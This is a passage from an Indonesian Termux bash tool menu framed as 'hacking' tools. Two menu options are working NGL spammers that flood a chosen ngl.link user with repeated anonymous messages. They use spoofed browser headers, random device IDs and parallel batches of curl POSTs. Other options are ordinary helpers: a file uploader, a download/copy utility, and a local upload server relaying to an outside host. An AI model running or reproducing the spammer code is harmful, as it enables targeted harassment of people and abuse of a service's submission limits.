        *)
            echo -e "${RED}✖ Pilihan tidak valid.${RESET}"
            sleep 5
            ;;
    esac
done
       ;;
           3|03)
clear
if ! command -v ruby &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing ruby..!!${g}"
        sleep 2 
        echo -e "${n}"
        pkg install ruby 
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} ruby sudah terinstall.${g}"
        sleep 2 
    fi
if ! command -v lolcat &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing lolcat (via gem)..!!${g}"
        sleep 2 
        echo -e "${n}"
        gem install lolcat
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} lolcat sudah terinstall.${g}"
        sleep 2 
    fi
BANNER=(
"╔════════════════════════════════════════╗"
"║                                        ║"
"║  ███╗   ██╗ ██████╗ ██╗                ║"
"║  ████╗  ██║██╔════╝ ██║                ║"
"║  ██╔██╗ ██║██║  ███╗██║                ║"
"║  ██║╚██╗██║██║   ██║██║                ║"
"║  ██║ ╚████║╚██████╔╝███████╗           ║"
"║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝           ║"
"║                                        ║"
"║  NGL Spammer - Thxyzz404 & Junz        ║"
"║                                        ║"
"╚════════════════════════════════════════╝"
)
animate_banner() {
    clear
    echo -e "\n\n"
    for line in "${BANNER[@]}"; do
        echo -e "$line"
        sleep 0.08
    done
    echo -e "\n\n"
}
show_progress() {
    local current=$1
    local total=$2
    local width=30
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    printf "\r${c}[ ${n}"
    printf "${g}%*s${n}" "$completed" "" | tr ' ' '>'
    printf "%*s" "$remaining" ""
    printf "${c} ] ${y}%d%%${n} ${c}(%d/%d)${n}" "$percentage" "$current" "$total"
}
random_device_id() {
    cat /dev/urandom | tr -dc 'a-z0-9' | head -c 16
}
send_message() {
    local username=$1
    local message=$2
    local index=$3
    local total=$4
    local device_id
    device_id=$(random_device_id)
    local url="https://ngl.link/api/submit"
    local data="{\"username\":\"$username\",\"question\":\"$message\",\"deviceId\":\"$device_id\"}"
    local response_code
    show_progress $((index + 1)) "$total"
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "$data" "$url" 2>/dev/null)
    if [[ $response_code -eq 200 ]]; then
        return 0
    else
        return 1
    fi
}
validate_number() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan jumlah target ${r}[ ${g}contoh : 250 ${r}]${c} : ")" input
        if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
            echo "$input"
            return 0
        else
            echo -e "${r}❌ Harap masukkan angka positif yang valid"
        fi
    done
}
validate_username() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan ngl target ${r}[ ${g}contoh : user/link ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            if [[ "$input" =~ ^https?://ngl\.link/(.+)$ ]]; then
                username="${BASH_REMATCH[1]}"
                username=$(echo "$username" | cut -d'/' -f1)
                echo "$username"
                return 0
            elif [[ "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                echo "$input"
                return 0
            else
                echo -e "${r}❌ Input tidak valid. Masukkan username NGL atau link yang valid (contoh: https://ngl.link/username atau username)"
            fi
        else
            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
validate_text() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan pesan untuk ngl ${r}[ ${g}contoh : woi_kon ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            echo "$input"
            return 0
        else
            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
main() {
    animate_banner
    echo -e "${y}🚀 Sedang menyiapkan alat."
    sleep 2
    echo -e "${p}────────────────────────────"
    echo -e "${c} 📝 Enter Target Details 📝"
    echo -e "${p}────────────────────────────"
    username=$(validate_username)
    message=$(validate_text)
    count=$(validate_number)
    echo -e "${n}────────────────────────────"
    echo -e "${p}     📋 Summary 📋"
    echo -e "${n}────────────────────────────"
    echo -e "${r}├─ ${g}Target : ${c}@$username"
    echo -e "${r}├─ ${g}Message : ${c}\"$message\""
    echo -e "${r}└─ ${g}Quantity : ${c}$count messages"
    echo -e "${n}────────────────────────────"
    echo -e "${y}"
    read -r -p "Mulai mengirim? (y/n) : " confirm
    echo ""
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Konfirmasi dibatalkan..!!"
        echo ""
    fi
    echo -e "${r}[ ${g}✓ ${r}]${b} Sedang proses pengiriman..!!"
    echo ""
    local success_count=0
    local fail_count=0
    for ((i=0; i<${count}; i++)); do
        if send_message "$username" "$message" "$i" "$count"; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        sleep $((1 + RANDOM % 3))
    done
    clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${y}[ ${r}SPAMMER,IN NGL ${y}]${g}==============="
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Pengiriman sukses : $success_count"
    echo -e "${r}[ ${g}x ${r}]${c} Pengiriman gagal : $fail_count"
    echo -e "${r}[ ${g}+ ${r}]${p} Total dikirim : $count"
    echo ""
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo ""
    trap 'clear; echo -e "${r}[ ${g}x ${r}]${g} Keluar Dari Script..!!"; exit 1' INT TERM
    echo ""
    main
fi
  ;;  
4|04)
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
clear
cok="ansi-rounded"
echo "
▗▖  ▗▖ ▗▄▄▖▗▖    ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
▐▛▚▖▐▌▐▌   ▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌▐▛▚▞▜▌▐▌   ▐▌ ▐▌
▐▌ ▝▜▌▐▌▝▜▌▐▌    ▝▀▚▖▐▛▀▘ ▐▛▀▜▌▐▌  ▐▌▐▌  ▐▌▐▛▀▀▘▐▛▀▚▖
▐▌  ▐▌▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▐▌   ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▐▙▄▄▖▐▌ ▐▌

           Development : Thxyzz404
" | boxes -d "$cok" | lolcat
echo -e "${g}"
read -p "MASUKKAN USERNAME NGL TARGET : " USERNAME
echo -e "${c}"
read -p "MASUKKAN PESAN UNTUK TARGET : " PESAN
echo -e "${y}"
read -p "MASUKKAN JUMLAH SPAM : " JUMLAH_BATCH
if [[ -z "$USERNAME" || -z "$PESAN" || -z "$JUMLAH_BATCH" ]]; then
    clear 
    echo ""
    echo -e "${r}[!] Error : Semua field harus diisi!"
    echo ""
    exit 1
fi
if ! [[ "$JUMLAH_BATCH" =~ ^[0-9]+$ ]]; then
    clear 
    echo ""
    echo -e "${r}[!] Error : Jumlah harus angka!"
    echo ""
    exit 1
fi
encode_url() {
    local string="$1"
    local length="${#string}"
    local result=""
    local c
    for ((i = 0; i < length; i++)); do
        c="${string:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) result+="$c" ;;
            ' ') result+="%20" ;;
            '!') result+="%21" ;;
            '"') result+="%22" ;;
            '#') result+="%23" ;;
            '$') result+="%24" ;;
            '&') result+="%26" ;;
            "'") result+="%27" ;;
            '(') result+="%28" ;;
            ')') result+="%29" ;;
            '*') result+="%2A" ;;
            '+') result+="%2B" ;;
            ',') result+="%2C" ;;
            '/') result+="%2F" ;;
            ':') result+="%3A" ;;
            ';') result+="%3B" ;;
            '=') result+="%3D" ;;
            '?') result+="%3F" ;;
            '@') result+="%40" ;;
            '[') result+="%5B" ;;
            ']') result+="%5D" ;;
            *) printf -v hex '%%%02X' "'$c"
               result+="$hex"
               ;;
        esac
    done
    echo "$result"
}
PESAN_ENC=$(encode_url "$PESAN")
TEMP_DIR="${HOME}/.ngl_temp"
mkdir -p "$TEMP_DIR"
clear 
echo ""
echo -e "${r}==============================================="
echo ""
echo -e "${g}Mengirim ke : $USERNAME"
echo "Pesan : $PESAN"
echo "Jumlah batch : $JUMLAH_BATCH (1 batch = 5 pesan)"
echo "Total pesan : $((JUMLAH_BATCH * 5))"
echo ""
echo -e "${r}==============================================="
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 3 detik..!!"
sleep 1
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 2 detik..!!"
sleep 1
echo -e "${r}[ ${g}+ ${r}]${c} Memulai dalam 1 detik..!!"
sleep 1
SUCCESS_COUNT=0
FAIL_COUNT=0
TOTAL_SENT=0
BATCH_NUMBER=1
send_batch() {
    local batch_num=$1
    local username=$2
    local message=$3
    echo -e "${p}"
    echo "───────────────────────────────────────────────"
    echo "  BATCH $batch_num - Mengirim 5 pesan sekaligus"
    echo "───────────────────────────────────────────────"
    echo -e "${n}" 
    local pids=()
    for ((j=1; j<=5; j++)); do
        local device_id="device_$(date +%s%N)_$RANDOM"
        (
            response=$(curl -s -w "%{http_code}" -o "${TEMP_DIR}/ngl_response_$$_$j" -X POST \
                -H "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: en-US,en;q=0.9" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Origin: https://ngl.link" \
                -H "Referer: https://ngl.link/$username" \
                -H "Sec-Fetch-Dest: empty" \
                -H "Sec-Fetch-Mode: cors" \
                -H "Sec-Fetch-Site: same-origin" \
                -d "username=$username&question=$message&deviceId=$device_id&gameSlug=&referrer=" \
                "https://ngl.link/api/submit" 2>/dev/null)
            echo "$response $j" >> "${TEMP_DIR}/ngl_batch_$$.txt"
        ) &
        pids+=($!)
        echo -e "  [Batch $batch_num - Pesan $j] ${y}Mengirim..!!"
        sleep 0.1
    done
    for pid in "${pids[@]}"; do
        wait $pid
    done
    local success_in_batch=0
    local fail_in_batch=0
    while read -r line; do
        local response_code=$(echo $line | awk '{print $1}')
        local message_num=$(echo $line | awk '{print $2}')
        if [[ "$response_code" == "200" ]]; then
            echo -e "  [Batch $batch_num - Pesan $message_num] ${g}Sukses ✓"
            ((SUCCESS_COUNT++))
            ((success_in_batch++))
        else
            echo -e "  [Batch $batch_num - Pesan $message_num] ${r}Gagal ✗ (kode: $response_code)"
            ((FAIL_COUNT++))
            ((fail_in_batch++))
        fi
        ((TOTAL_SENT++))
    done < "${TEMP_DIR}/ngl_batch_$$.txt"
    rm -f "${TEMP_DIR}/ngl_batch_$$.txt" "${TEMP_DIR}/ngl_response_$$_"*
    echo -e "${p}  └─ Batch $batch_num selesai : ${g}$success_in_batch sukses${c}, ${r}$fail_in_batch gagal"
    echo ""
}
for ((batch=1; batch<=JUMLAH_BATCH; batch++)); do
    send_batch $batch "$USERNAME" "$PESAN_ENC"
    echo -e "${r}[ ${g}+ ${r}]${c} Progress : $batch/$JUMLAH_BATCH batch"
    echo -e "${r}[ ${g}+ ${r}]${c} Total dikirim : $TOTAL_SENT pesan"
    echo -e "${r}[ ${g}+ ${r}]${c} Sukses : $SUCCESS_COUNT | Gagal : $FAIL_COUNT"
    echo ""
    if [ $batch -lt $JUMLAH_BATCH ]; then
        echo -e "${y}[ ✓ ] Menunggu 2 detik sebelum batch berikutnya..!!"
        sleep 2
    fi
done
rm -f "${TEMP_DIR}/ngl_"* 2>/dev/null
echo -e "${g}"
echo "==============================================="
echo "             PROSES SELESAI                   "
echo "==============================================="
echo -e "${n}"
echo -e "Target : ${r}$USERNAME"
echo -e "Jumlah batch : ${c}$JUMLAH_BATCH"
echo -e "Total pesan dikirim : ${y}$TOTAL_SENT"
echo -e "${g}Pesan sukses : $SUCCESS_COUNT"
echo -e "${p}Pesan gagal : $FAIL_COUNT"
if [ $TOTAL_SENT -gt 0 ]; then
    SUCCESS_RATE=$((SUCCESS_COUNT * 100 / TOTAL_SENT))
    echo -e "Tingkat keberhasilan : ${g}$SUCCESS_RATE%"
    echo ""
fi
if [ $FAIL_COUNT -eq 0 ] && [ $SUCCESS_COUNT -gt 0 ]; then
    echo -e "${c}[✓] Excellent! Semua pesan terkirim sukses!"
elif [ $FAIL_COUNT -lt $SUCCESS_COUNT ]; then
    echo -e "${y}[!] Good! sebagian besar pesan terkirim."
else
    echo -e "${r}[!] Mungkin ada masalah dengan target atau koneksi."
fi
          ;;
                 *)
        echo ""
        echo -e "${y}Pilihan Tidak Valid...!!"
        sleep 2
        ;;
        esac
            echo ""
            echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
            read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
            clear
               ;;
       22)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
g="\033[32;1m"
c="\033[36;1m"
r="\033[31;1m"
y="\033[33;1m"
p="\033[35;1m"
mek="ansi-rounded"
URLS=()
FILES=()
clear
tmp() {
cowsay -f eyes 'Upload foto URL' | boxes -d "$mek" | lolcat
}
file_upload() {
 local file="$1"
  if [ ! -f "$file" ]; then
     echo ""
     echo -e "${r}✗ File tidak ditemukan : $file "
     sleep 2
        return 1
     fi
     name=$(basename "$file")
     size=$(du -h "$file" | cut -f1)
     echo -e "${y}📤 Mengupload file..!!${c}"
     echo -e "  Nama : $name"
     echo -e "  Ukuran : $size"
     echo -e "  Server : x0.at"
     echo ""
     local response=$(curl -s -F "file=@$file" "https://x0.at")
      if [[ $response == https://x0.at/* ]]; then
        echo -e "${g}✅ Upload berhasil! "
        echo -e "${g}🔗 URL : $response "
        echo ""
            URLS+=("$response")
            FILES+=("$file")
            return 0
         else
            echo -e "${r}❌ Upload gagal!${p} "
            echo -e "Response : $response"
            echo
            return 1
         fi
}
show_urls() {
  if [ ${#URLS[@]} -eq 0 ]; then
     echo -e "${p}📭 Belum ada file yang diupload."
       return
    fi
      echo -e "${c}HASIL UPLOAD "
      echo ""
      for i in "${!URLS[@]}"; do
        echo -e "${y}File $((i + 1))${g}"
        echo -e "  Nama : $(basename "${FILES[$i]}")"
        echo -e "  URL : ${URLS[$i]}"
        echo ""
   done
}
menu() {
 while true; do
     tmp
        if [ ${#URLS[@]} -gt 0 ]; then
            echo -e "${c}📋 File yang sudah diupload : ${#URLS[@]} file..!! "
            echo ""
        fi
echo ""
echo -e "${r}[ ${g}1 ${r}]${y} Upload file"
echo -e "${r}[ ${g}2 ${r}]${y} Lihat URL hasil upload"
echo -e "${r}[ ${g}3 ${r}]${y} Hapus semua history"
echo -e "${r}[ ${g}4 ${r}]${y} Keluar"
echo -e "${c}"
read -p "Masukkan pilihan (1-4) : " choice
   case $choice in
         1)
             echo -e "${y}"
             read -e -p "Masukkan path file : " filepath
               if [ -n "$filepath" ]; then
                   file_upload "$filepath"
                   echo ""
                   echo -e "${c}Tekan Enter untuk melanjutkan..."
                   read
                   clear 
               fi
                  ;;
         2)
             echo ""
             show_urls
             echo ""
             echo -e "${c}Tekan Enter untuk melanjutkan..."
             read
             clear
               ;;
         3)
             URLS=()
             FILES=()
             echo ""
             echo -e "${g}✅ History berhasil dihapus."
             sleep 2
             clear 
               ;;
         4)
             echo ""
             echo -e "${r}Terima kasih telah menggunakan!"
             echo ""
             break 1
               ;;
            *)
                echo ""
                echo -e "${p}Pilihan tidak valid! "
                sleep 2
                clear 
                 ;;
          esac
    done
}
menu
      echo ""
          echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
              ;;
       23)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
███████╗██╗   ██╗    ███████╗██╗██╗     ███████╗
██╔════╝██║   ██║    ██╔════╝██║██║     ██╔════╝
███████╗██║   ██║    █████╗  ██║██║     █████╗  
╚════██║╚██╗ ██╔╝    ██╔══╝  ██║██║     ██╔══╝  
███████║ ╚████╔╝     ██║     ██║███████╗███████╗
╚══════╝  ╚═══╝      ╚═╝     ╚═╝╚══════╝╚══════╝
           Developer : Thxyzz404
" | lolcat 
echo ""
echo -e "${g}           Pilihan Metode Anda${n}"
echo "============================================"
echo -e "${r}  [ ${g}01${r} ]${y} Input link & simpan dengan curl"
echo -e "${r}  [ ${g}02${r} ]${y} Pindahkan file (mv) ke folder"
echo -e "${r}  [ ${g}03${r} ]${y} Salin file (cp) ke folder"
echo -e "${r}  [ ${g}04${r} ]${c} Keluar dari tools${n}"
echo "============================================"
echo -e "${g}"
read -p "Pilihan Anda (1/2/4) : " mode
case "$mode" in
  1|01)
    echo -e "${y}"
    read -p "Masukkan link file anda : " input_link
    echo -e "${c}"
    read -p "Masukkan nama file simpan [ contoh : script.py ] : " file
    echo ""
    echo -e "${c}Mengunduh dari ${r}: ${n}$input_link"
    echo -e "${c}Menyimpan ke ${r}: ${n}/sdcard/Download/$file"
    echo ""
    curl -L "$input_link" -o "/sdcard/Download/$file"
    echo ""
    echo -e "${g}Unduhan selesai [ jika tidak ada error ]"
    ;;
  2|02)
    echo -e "${y}"
    read -p "Masukkan nama file anda di mv HOME : " file
    if [[ ! -f "$HOME/$file" ]]; then
      echo ""
      echo -e "${r}Nama File Tidak Ditemukan..!!"
      echo ""
    fi
    mv "$HOME/$file" "/sdcard/Download/"
    echo ""
    echo -e "${c}File berhasil dipindahkan ke ${r}[ ${g}sdcard/Download${r} ]"
    ;;
  3|03)
    echo -e "${y}"
    read -p "Masukkan nama file anda di cp HOME : " file
    if [[ ! -f "$HOME/$file" ]]; then
      echo ""
      echo -e "${r}Nama File Tidak Ditemukan..!!"
    fi
    cp "$HOME/$file" "/sdcard/Download/"
    echo ""
    echo -e "${c}File berhasil disalin ke ${r}[ ${g}sdcard/Download${r} ]"
    ;;
  *)
    echo ""
    echo -e "${y} Pilihan Anda Tidak Valid..!!"
    ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
     ;;
         24)
                echo ""
                mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
                echo -e "${c} Anda Memilih Menu Hacking..!!"
                echo ""
                echo -e "${r} VIP UNLOCK..!!"
                sleep 2
                clear
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
░█░█░█▀█░█░░░█▀█░█▀█░█▀▄
░█░█░█▀▀░█░░░█░█░█▀█░█░█
░▀▀▀░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀░ " | lolcat
echo ""
echo -e "${p} Developer ${r}: ${c}Thxyzz404"
echo ""
prot=$(( (RANDOM % 7000) + 3000 ))
echo -e "${r}[ ${g}+ ${r}]${y} Generator prot..!!"
echo -e "${r}[ ${g}✓ ${r}]${c} Prot yg di dapat : ${prot}"
echo -e "${g}"
read -p "Pakai port random? (y/n) : " ran
if [[ $ran == "n" || $ran == "N" ]]; then
    echo -e "${b}"
    read -p "Masukkan prot tujuan : " rot
    PORT=$rot
else
    PORT=$prot
fi
echo ""
echo -e "${y}✅ Menggunakan port : $PORT"
echo -e "${p}"
python3 - "$PORT" << 'PYEOF'
import os
import sys
import json
import datetime
import uuid
import requests
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
PORT = int(sys.argv[1])
SAVE_DIR = "uploads"
os.makedirs(SAVE_DIR, exist_ok=True)
HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NanzzUploader</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0c10;font-family:Arial;color:#fff;padding:20px}
.container{max-width:600px;margin:0 auto}
.box{background:rgba(20,25,45,0.9);border-radius:20px;padding:30px;border:1px solid #7c3aed}
h1{text-align:center;margin-bottom:10px;background:linear-gradient(135deg,#a855f7,#3b82f6);-webkit-background-clip:text;background-clip:text;color:transparent}
.sub{text-align:center;color:#888;margin-bottom:30px}
.upload-area{border:2px dashed #7c3aed;border-radius:15px;padding:40px;text-align:center;cursor:pointer;margin:20px 0}
.upload-area:hover{background:rgba(124,58,237,0.1)}
input{display:none}
.file-info{background:#1a1f2e;padding:12px;border-radius:10px;margin:15px 0;border-left:3px solid #a855f7}
button{width:100%;padding:15px;background:linear-gradient(95deg,#7c3aed,#3b82f6);border:none;border-radius:50px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0}
button:disabled{opacity:0.5}
.result{background:#1a1f2e;border-radius:15px;padding:20px;margin-top:20px;display:none}
.result.success{display:block;border-left:4px solid #10b981}
.result.error{display:block;border-left:4px solid #ef4444}
.url{background:#000;padding:10px;border-radius:10px;word-break:break-all;margin:10px 0}
.url a{color:#60a5fa;text-decoration:none}
.copy-btn{background:#2d2f42;border:none;padding:8px 20px;border-radius:20px;color:#fff;cursor:pointer;font-size:12px}
.loader{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-radius:50%;border-top-color:#a855f7;animation:spin 0.6s linear infinite;margin-right:10px}
@keyframes spin{to{transform:rotate(360deg)}}
.footer{text-align:center;font-size:11px;color:#555;margin-top:30px;padding-top:20px;border-top:1px solid #1a1f2e}
</style>
</head>
<body>
<div class="container">
<div class="box">
<h1>UPLOADER VIDEO</h1>
<div class="sub">Moonlight Edition • Unlimited Size</div>
<div class="upload-area" id="dropZone">
<div style="font-size:40px">☁️</div>
<div style="margin:10px 0">Klik atau drag & drop file</div>
<div style="font-size:12px;color:#888">MP4, JPG, PNG, PDF, etc</div>
<input type="file" id="fileInput">
</div>
<div id="fileInfo" class="file-info" style="display:none"></div>
<button id="uploadBtn">🚀 UPLOAD SEKARANG</button>
<div id="result" class="result"></div>
</div>
<div class="footer">🔗 gobox.my.id • Port: """ + str(PORT) + """</div>
</div>
<script>
let selectedFile = null;
const dropZone = document.getElementById('dropZone');
const fileInput = document.getElementById('fileInput');
const fileInfo = document.getElementById('fileInfo');
const uploadBtn = document.getElementById('uploadBtn');
const resultDiv = document.getElementById('result');
function formatBytes(bytes) {
    if(bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
function updateFileInfo(file) {
    if(!file) {
        fileInfo.style.display = 'none';
        return;
    }
    fileInfo.innerHTML = '📎 ' + file.name + ' (' + formatBytes(file.size) + ')';
    fileInfo.style.display = 'block';
}
fileInput.addEventListener('change', (e) => {
    if(e.target.files && e.target.files[0]) {
        selectedFile = e.target.files[0];
        updateFileInfo(selectedFile);
    }
});
dropZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    dropZone.style.background = 'rgba(124,58,237,0.2)';
});
dropZone.addEventListener('dragleave', () => {
    dropZone.style.background = 'transparent';
});
dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    dropZone.style.background = 'transparent';
    if(e.dataTransfer.files && e.dataTransfer.files[0]) {
        selectedFile = e.dataTransfer.files[0];
        fileInput.files = e.dataTransfer.files;
        updateFileInfo(selectedFile);
    }
});
dropZone.addEventListener('click', () => fileInput.click());
uploadBtn.addEventListener('click', async () => {
    if(!selectedFile) {
        alert('Pilih file dulu!');
        return;
    }   
    resultDiv.innerHTML = '<div class="loader"></div> Mengupload...';
    resultDiv.className = 'result';
    uploadBtn.disabled = true;
    const formData = new FormData();
    formData.append('photo', selectedFile); 
    try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const data = await res.json();       
        if(data.url) {
            resultDiv.className = 'result success';
            resultDiv.innerHTML = '<strong>✅ BERHASIL!</strong><div class="url"><a href="'+data.url+'" target="_blank">'+data.url+'</a></div><button class="copy-btn" onclick="navigator.clipboard.writeText(\\''+data.url+'\\');alert(\\'Tersalin!\\')">📋 SALIN LINK</button>';
        } else {
            throw new Error(data.error || 'Gagal upload');
        }
    } catch(err) {
        resultDiv.className = 'result error';
        resultDiv.innerHTML = '<strong>❌ GAGAL!</strong><br>' + err.message;
    } finally {
        uploadBtn.disabled = false;
    }
});
</script>
</body>
</html>
"""
class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        if self.path in ('/', '/index.html'):
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML.encode())
        else:
            self.send_error(404)    
    def do_POST(self):
        if self.path != '/upload':
            self.send_error(404)
            return       
        try:
            ct = self.headers.get('Content-Type', '')
            cl = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(cl)            
            match = re.search(r'boundary=(.+)', ct)
            if not match:
                self.send_error(400)
                return            
            boundary = match.group(1).encode()
            parts = raw.split(b'--' + boundary)
            content = None
            fname = None          
            for part in parts:
                if b'Content-Disposition' in part:
                    fn = re.search(rb'filename="([^"]+)"', part)
                    if fn:
                        fname = fn.group(1).decode()
                    sep = part.find(b'\r\n\r\n')
                    if sep != -1:
                        start = sep + 4
                        end = part.rfind(b'\r\n--')
                        if end == -1:
                            end = len(part)
                        content = part[start:end]
                        break           
            if not content or not fname:
                self.send_error(400)
                return            
            fid = uuid.uuid4().hex[:8]
            ext = fname.split('.')[-1] if '.' in fname else 'bin'
            path = os.path.join(SAVE_DIR, f'temp_{fid}.{ext}')          
            with open(path, 'wb') as f:
                f.write(content)          
            with open(path, 'rb') as f:
                r = requests.post('https://www.gobox.my.id/upload', files={'file': (fname, f)}, timeout=180)          
            os.remove(path)
            res = r.json()            
            if r.status_code == 200 and res.get('url'):
                data = {'url': res['url']}
            else:
                data = {'error': res.get('error', 'Upload failed')}                
        except Exception as e:
            data = {'error': str(e)}        
        js = json.dumps(data).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(js))
        self.end_headers()
        self.wfile.write(js)
print(f'\n✅ Server : http://localhost:{PORT}')
print(f'📁 Temp : {SAVE_DIR}')
print('Press Ctrl+C to stop\n')
try:
    HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()
except KeyboardInterrupt:
    print('\n🛑 Stopped')
PYEOF
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      25)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo ""
if ! command -v curl &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} curl belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    sleep 3 
    pkg install curl -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} curl sudah terinstall."
    echo ""
    sleep 3 
fi
if ! command -v jq &> /dev/null; then
    clear 
    echo ""
